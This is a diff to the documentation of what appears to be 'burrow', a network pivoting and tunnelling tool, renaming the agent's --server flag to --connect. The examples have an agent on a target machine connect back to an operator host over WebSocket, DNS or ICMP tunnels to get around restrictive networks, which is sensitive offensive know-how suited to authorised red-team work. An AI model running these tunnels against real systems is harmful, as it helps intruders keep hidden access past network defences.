@@ -111,7 +111,7 @@ The agent auto-reconnects on disconnect. Use `--retry` to cap reconnection attem
 
 | Flag | Default | Description |
 |------|---------|-------------|
-| `--server, -s` | (required) | Server address (`host:port`) |
+| `--connect, -c` | (required) | Server address to connect to (`host:port`) |
 | `--fingerprint` | | Expected server TLS fingerprint (SHA256). Format: `SHA256:hex...` |
 | `--retry` | `0` | Max reconnection attempts. `0` means infinite. |
 | `--transport, -t` | `raw` | Transport protocol: `raw`, `ws`, `dns`, `icmp` |
@@ -121,22 +121,22 @@ The agent auto-reconnects on disconnect. Use `--retry` to cap reconnection attem
 
 ```bash
 # Basic connection
-burrow agent --server 10.0.0.1:11601
+burrow agent --connect 10.0.0.1:11601
 
 # With fingerprint verification (recommended)
-burrow agent --server 10.0.0.1:11601 --fingerprint SHA256:a3f2c1...
+burrow agent -c 10.0.0.1:11601 --fingerprint SHA256:a3f2c1...
 
 # WebSocket transport
-burrow agent --server 10.0.0.1:443 --transport ws
+burrow agent --connect 10.0.0.1:443 --transport ws
 
 # DNS tunnel
-burrow agent --server 10.0.0.1:53 --transport dns
+burrow agent --connect 10.0.0.1:53 --transport dns
 
 # ICMP tunnel
-burrow agent --server 10.0.0.1:0 --transport icmp
+burrow agent --connect 10.0.0.1:0 --transport icmp
 
 # Limit reconnection attempts
-burrow agent --server 10.0.0.1:11601 --retry 5
+burrow agent -c 10.0.0.1:11601 --retry 5
 ```
 
 **Expected output:**
@@ -578,7 +578,7 @@ burrow server --webui
 # Note the fingerprint printed on startup
 
 # Target machine: run agent
-burrow agent --server OPERATOR_IP:11601 --fingerprint SHA256:a3f2c1...
+burrow agent --connect OPERATOR_IP:11601 --fingerprint SHA256:a3f2c1...
 
 # Operator: list sessions
 burrow session list --webui-addr 127.0.0.1:8080
@@ -614,7 +614,7 @@ burrow pivot --target final.host --port 443 --hop hop1:22 --hop hop2:443 --local
 burrow server --transport ws --listen 0.0.0.0:443 --webui
 
 # Target: connect back using WebSocket
-burrow agent --server operator.com:443 --transport ws --fingerprint SHA256:a3f2c1...
+burrow agent --connect operator.com:443 --transport ws --fingerprint SHA256:a3f2c1...
 ```
 
 ### DNS Tunnel Through Restrictive Network
@@ -624,7 +624,7 @@ burrow agent --server operator.com:443 --transport ws --fingerprint SHA256:a3f2c
 burrow server --transport dns --listen 0.0.0.0:53
 
 # Target: connect via DNS
-burrow agent --server operator.com:53 --transport dns
+burrow agent --connect operator.com:53 --transport dns
 ```
 
 ### SOCKS5 Proxy for Tool Routing
